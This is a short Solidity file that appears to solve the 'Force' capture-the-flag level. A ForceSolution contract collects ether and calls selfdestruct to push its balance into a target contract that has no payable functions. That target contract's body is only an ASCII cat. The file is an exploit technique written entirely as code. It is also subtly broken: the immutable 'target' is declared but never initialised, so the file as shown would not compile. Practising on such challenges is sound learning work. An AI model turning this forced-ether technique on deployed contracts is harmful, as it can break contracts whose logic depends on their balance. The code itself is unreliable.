// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolution {
    Force private immutable target;
    address payable private immutable targetAddr;

    constructor(address _target) {
        targetAddr = payable(_target);
    }

    function collect() public payable returns(uint) {
        return address(this).balance;
    }

    function selfDestroy() public {
        selfdestruct(targetAddr);
    }
}

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }